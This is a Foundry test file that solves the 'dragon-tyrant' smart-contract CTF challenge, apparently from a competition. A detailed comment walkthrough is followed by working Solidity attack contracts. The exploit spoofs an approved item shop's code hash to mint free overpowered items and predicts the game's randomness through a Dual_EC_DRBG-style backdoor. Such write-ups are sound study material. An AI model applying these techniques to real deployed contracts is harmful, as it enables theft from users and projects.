// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// Bringing the deps like Deploy.s.sol does
import "../../src/dragon-tyrant/Challenge.sol";
import "../../src/dragon-tyrant/Factory.sol";
import "../../src/dragon-tyrant/ItemShop.sol";
import "../../src/dragon-tyrant/NFT.sol";

contract DragonTyrantTest is Test {
  address private immutable deployerAddress = makeAddr("deployer");
  address private immutable playerAddress = makeAddr("player");
  address private immutable randomnessOperatorAddress = makeAddr("randomnessOperator");

  address private challengeAddress;

  function setUp() public {
    vm.startPrank(deployerAddress);
    // Simulating the deployment process from Deploy.s.sol
    Factory factory = new Factory();
    factory.setRandomnessOperator(randomnessOperatorAddress);

    ItemShop itemShop = ItemShop(factory.createItemShop(address(factory.latestItemShopVersion()), abi.encode("")));

    NFT nft = NFT(factory.createCollection(abi.encode(string("Fighters"), string("FGHTRS"))));

    challengeAddress = address(new Challenge(factory, itemShop, nft));

    vm.stopPrank();
  }

  // Challenge Analysis
  //
  // This challenge leverages an RPG-style game where a dragon boss is
  // represented as an ERC-721 token with specific properties. The objective
  // is to burn this token—thus defeating the boss—to win the challenge.
  // Assuming there are no access control flaws that let us burn the token
  // directly, we must work through the game’s functions.
  //
  // The fight mechanism is based on two 256-bit values: one provided by the
  // player and one generated randomly for the boss. Each bit corresponds to a
  // round, where a bit value of 1 indicates an attack and 0 indicates a defense.
  // A character loses health when attacked while not defending, so the optimal
  // strategy is to attack when the opponent is defending and defend when the
  // opponent attacks. This means that if we can predict the random number
  // dictating the boss's moves, we can tailor our moves to ensure victory.
  //
  // Moreover, player characters are initially too weak to deal significant
  // damage to the dragon boss or to withstand its attacks. To overcome this,
  // our character must acquire better equipment from the ItemShop. However,
  // since no ether is provided to purchase items, we need to find a way to
  // exploit the system to obtain the necessary gear.
  //
  // In summary, winning the challenge requires:
  // - Exploiting the system to equip our character with powerful items.
  // - Predicting the random number used by the boss to counter its strategy.
  //
  // Exploiting the ItemShop
  //
  // - Players can acquire and equip items from any ItemShop approved by the
  //   Factory. The NFT contract verifies this by checking
  //   `factory.isItemShopApprovedByFactory()`, which ensures that the
  //   ItemShop’s extcodehash is approved rather than a specific address.
  //
  // - The key to bypassing this verification is to create an `AttackerItemShop`
  //   contract that inherits from `ItemShop`, ensuring it maintains the correct
  //   storage structure. This contract should define custom items in its
  //   constructor.
  //
  // - At the end of its constructor, `AttackerItemShop` should return the
  //   runtime code of the original `ItemShop`. This ensures that after
  //   deployment, the contract shares the same extcodehash as a valid
  //   ItemShop instance, passing the Factory’s verification.
  //
  // - Once deployed and approved, the attacker can use this custom ItemShop
  //   to freely provide powerful items to their NFT, bypassing the need to
  //   spend ether. More importantly, the attacker can define arbitrary stats
  //   for these items, creating overpowered equipment.
  //
  // Predicting the Random Number and Completing the Challenge
  //
  // - The exploit leverages a vulnerability similar to the known backdoor in
  //   Dual_EC_DRBG, a pseudorandom number generator that uses elliptic curves.
  //   The key to breaking this system lies in knowing the discrete logarithm
  //   k such that Q = k * P. By reconstructing previous outputs, we can predict
  //   future random numbers, giving us full control over the game's randomness.
  //
  // - The game includes a watcher that listens for the `RequestOffchainRandomness`
  //   event. When detected, the watcher calls `resolveRandomness()` in the NFT
  //   contract, supplying a new seed. This function is triggered at most once
  //   per block.
  //
  // - The attack is executed in two phases ensuring that `resolveRandomness()`
  //   first mints a player character before resolving the fight with the dragon.
  //
  // - Phase 1: Minting the First Player
  //   - We call `nft.batchMint()` to request the creation of a player character.
  //     This emits the `RequestOffchainRandomness` event.
  //   - The watcher detects this event and calls `resolveRandomness()`, which
  //     generates a random number and mints the player character.
  //   - This player character is necessary before initiating a fight.
  //
  // - Phase 2: Equipping for Battle and Predicting the Next Random Number
  //   - We deploy our malicious ItemShop, allowing us to obtain and equip
  //     overpowered items at no cost.
  //   - The equipped player is then set up to fight the dragon boss.
  //   - Before resolving the fight, we call `nft.batchMint()` again to request
  //     another player character.
  //   - This step is critical once the new player is minted, we can
  //     reconstruct the random number used for its stats, allowing us to
  //     predict the next random number.
  //
  // - Final Step: Winning the Fight
  //   - The watcher detects `RequestOffchainRandomness()` again and calls
  //     `resolveRandomness()` with a new seed.
  //   - During the ERC-721 mint callback (`onERC721Received`), we reconstruct
  //     the random number used for minting and use the exploit to compute
  //     the next random number.
  //   - `resolveRandomness()` also finalizes the requested fight, calling
  //     `getInput()` on our attacker contract, which provides the player’s
  //     strategy.
  //   - Since we know the next random number we XOR it with the boss’s
  //     expected moves, ensuring an optimal counter-strategy.
  //
  // - By combining the predicted counter-strategy with our overpowered items
  //   we guarantee victory, allowing the player to defeat the dragon boss and
  //   complete the challenge.
  //
  function testExploit() public {
    assertFalse(Challenge(challengeAddress).isSolved());

    vm.startPrank(playerAddress);
    Attacker attacker = new Attacker(challengeAddress);
    attacker.attackPhase0();
    vm.stopPrank();

    vm.startPrank(randomnessOperatorAddress);
    NFT(Challenge(challengeAddress).TOKEN()).resolveRandomness(bytes32(vm.randomUint()));
    vm.stopPrank();

    vm.startPrank(playerAddress);
    attacker.attackPhase1();
    vm.stopPrank();

    vm.startPrank(randomnessOperatorAddress);
    NFT(Challenge(challengeAddress).TOKEN()).resolveRandomness(bytes32(vm.randomUint()));
    vm.stopPrank();

    assertTrue(Challenge(challengeAddress).isSolved());
  }
}

contract AttackerItemShop is ItemShop {
  constructor(address deployedItemShopAddress) {
    // Adding overpowered items to our custom ItemShop.
    // Since we inherit from ItemShop, we can directly modify `_itemInfo`.
    uint256 counter = 0;
    _itemInfo[++counter] = ItemInfo({name: "Weapon", slot: EquipmentSlot.Weapon, value: type(uint40).max, price: 0});
    _mint(address(this), counter, 1, "");

    _itemInfo[++counter] = ItemInfo({name: "Shield", slot: EquipmentSlot.Shield, value: type(uint40).max, price: 0});
    _mint(address(this), counter, 1, "");

    // Deploys the runtime code of ItemShop, ensuring that our contract
    // has the same extcodehash as a valid ItemShop instance.
    // This allows it to pass `Factory.isItemShopApprovedByFactory()`.
    bytes memory code = address(deployedItemShopAddress).code;
    assembly {
      return(add(code, 0x20), mload(code))
    }
  }
}

contract Attacker {
  NFT private nft;
  ItemShop private itemShop;
  uint256 private playerID;
  uint256 private onERC721ReceivedNumCalls;
  uint256 private nextRandomNumber;

  constructor(address challengeAddress) {
    nft = Challenge(challengeAddress).TOKEN();
    itemShop = Challenge(challengeAddress).ITEMSHOP();
  }

  // Requests the creation of the player that will fight the dragon.
  // The NFT contract emits a `RequestOffchainRandomness()` event,
  // which is detected by the watcher, prompting it to call `resolveRandomness()`.
  // This function will mint the ERC-721 player character.
  function attackPhase0() external {
    address[] memory receivers = new address[](1);
    receivers[0] = address(this);
    nft.batchMint(receivers);

    // NOTE:
    // The watcher will call `resolveRandomness()`, minting the player.
    // Once that happens, we proceed to `attackPhase1()`.
  }

  // Deploys our custom ItemShop, equips the player with overpowered items,
  // initiates the fight against the dragon boss, and finally requests
  // the minting of another player via `nft.batchMint()`.
  //
  // The final minting step is crucial: it allows us to reconstruct the
  // random number used, enabling us to predict the next generated value
  // and formulate an optimal counter-strategy.
  function attackPhase1() external {
    AttackerItemShop attackerItemShop = new AttackerItemShop(address(itemShop));

    attackerItemShop.buy{value: 0}(1);                      // Obtain the weapon
    attackerItemShop.buy{value: 0}(2);                      // Obtain the shield
    attackerItemShop.setApprovalForAll(address(nft), true); // Grant equip approval

    playerID = nft.tokenOfOwnerByIndex(address(this), 0);
    nft.equip(playerID, address(attackerItemShop), 1);
    nft.equip(playerID, address(attackerItemShop), 2);

    nft.fight(uint128(playerID), 0);

    address[] memory receivers = new address[](1);
    receivers[0] = address(this);
    nft.batchMint(receivers);

    // NOTE:
    // The watcher will again call `resolveRandomness()`, minting another player.
    // When `onERC721Received()` is triggered, we compute the next random number.
    // Subsequently, `getInput()` will be called, allowing us to provide
    // a counter-strategy.
  }

  // Returns the counter-strategy, derived from the predicted next random value.
  function getInput(FighterVars calldata, FighterVars calldata) external view returns (uint256) {
    // The strategy is simple: when the dragon attacks, we defend, and vice versa.
    // Since we can predict the next random number, we generate our moves by XORing it.
    return ~nextRandomNumber;
  }

  // Handles the receipt of ERC-721 tokens minted by `_resolveMint()`.
  function onERC721Received(address, address, uint256 tokenID, bytes memory) external returns (bytes4) {
    onERC721ReceivedNumCalls++;
    if (onERC721ReceivedNumCalls == 2) {
      // The first call delivers our fighter. The second call
      // provides the additional minted character, which we use
      // to reconstruct the next random number.
      _computeNextRandomNumber(tokenID);
    }

    return this.onERC721Received.selector;
  }

  // Handles the receipt of ERC-1155 items purchased from the ItemShop.
  function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
    return this.onERC1155Received.selector;
  }

  // Reconstructs the previously used random number from the newly minted NFT.
  // Using our knowledge of `k` in `Q = k * P`, we compute the next random number,
  // allowing us to predict future randomness.
  function _computeNextRandomNumber(uint256 tokenID) private {
    // Step 1: Reconstruct the previously used random number
    Trait memory trait = nft.traits(tokenID);
    uint256 previouslyUsedRandomNumber =
      uint256(trait.rarity)              |
      uint256(trait.strength) << 16      |
      uint256(trait.dexterity) << 56     |
      uint256(trait.constitution) << 96  |
      uint256(trait.intelligence) << 136 |
      uint256(trait.wisdom) << 176       |
      uint256(trait.charisma) << 216;

    // Step 2: Compute B', the next random number
    //
    // Given known values: B (the recovered random number), P, Q, and k,
    // we leverage the relationship Q = k * P to derive B'.
    //
    // 1. B = A.x * Q
    // 2. B = A.x * k * P   ; (using Q = k * P)
    // 3. k⁻¹ * B = k⁻¹ * A.x * k * P
    // 4. k⁻¹ * B = A.x * P
    //
    // Since A.x * P = A' (the next round’s state),
    // we compute B' as:
    //
    // B' = (A').x * Q = (A.x * P).x * Q = (k⁻¹ * B).x * Q
    uint256 kInverse = RandomnessUtils.computeKInverse();
    uint256 Bx = previouslyUsedRandomNumber; // Alias for clarity
    uint256 By = RandomnessUtils.getY(Bx);

    uint256[2] memory aPrime = RandomnessUtils.ecMul(Bx, By, kInverse);
    uint256[2] memory bPrime = RandomnessUtils.ecMul(nft.randomness().Qx(), nft.randomness().Qy(), aPrime[0]);

    nextRandomNumber = bPrime[0];
  }
}

library RandomnessUtils {
  uint256 constant r = 0x123456789;
  uint256 constant fieldOrder = 21888242871839275222246405745257275088696311157297823662689037894645226208583;
  uint256 constant groupOrder = 21888242871839275222246405745257275088548364400416034343698204186575808495617;

  // Computes k = r⁻¹ * H(r) mod groupOrder
  function computeK() internal pure returns (uint256) {
    uint256 H_r = uint256(keccak256(abi.encodePacked(r))); // H(r)
    uint256 r_inv = modInverse(r, groupOrder); // r⁻¹ mod groupOrder
    return mulmod(r_inv, H_r, groupOrder); // (r⁻¹ * H(r)) mod groupOrder
  }

  // Computes k⁻¹ mod groupOrder
  function computeKInverse() internal pure returns (uint256) {
    uint256 k = computeK(); // Compute k first
    return modInverse(k, groupOrder); // Compute k⁻¹ mod groupOrder
  }

  // Computes modular inverse using Fermat’s Little Theorem
  function modInverse(uint256 a, uint256 p) internal pure returns (uint256) {
    return expMod(a, p - 2, p);
  }

  // Efficient exponentiation by squaring for modular arithmetic
  function expMod(uint256 base, uint256 exp, uint256 mod) internal pure returns (uint256) {
    uint256 result = 1;
    while (exp > 0) {
      if (exp % 2 == 1) {
        result = mulmod(result, base, mod);
      }
      base = mulmod(base, base, mod);
      exp /= 2;
    }
    return result;
  }

  // Computes the modular square root using Tonelli-Shanks algorithm.
  function modSqrt(uint256 a, uint256 p) internal pure returns (uint256) {
    return expMod(a, (p + 1) / 4, p); // Valid for p ≡ 3 mod 4 (which BN254 satisfies)
  }

  // Given an x-coordinate on BN254, computes the corresponding y-coordinate.
  function getY(uint256 x) internal pure returns (uint256) {
    uint256 rhs = addmod(mulmod(x, mulmod(x, x, fieldOrder), fieldOrder), 3, fieldOrder); // x^3 + 3 mod fieldOrder
    return modSqrt(rhs, fieldOrder);
  }

  // Performs elliptic curve multiplication on the BN254 curve.
  function ecMul(uint256 x, uint256 y, uint256 scalar) internal view returns (uint256[2] memory output) {
    assembly {
      let input := mload(0x40) // Free memory pointer
      mstore(input, x)         // Store x-coordinate
      mstore(add(input, 0x20), y) // Store y-coordinate
      mstore(add(input, 0x40), scalar) // Store scalar

      // Call the precompile 0x07 (EC Mul) with 0x60 (96 bytes) input and 0x40 (64 bytes) output
      if iszero(staticcall(gas(), 0x07, input, 0x60, output, 0x40)) {
        revert(0, 0)
      }
    }
  }
}
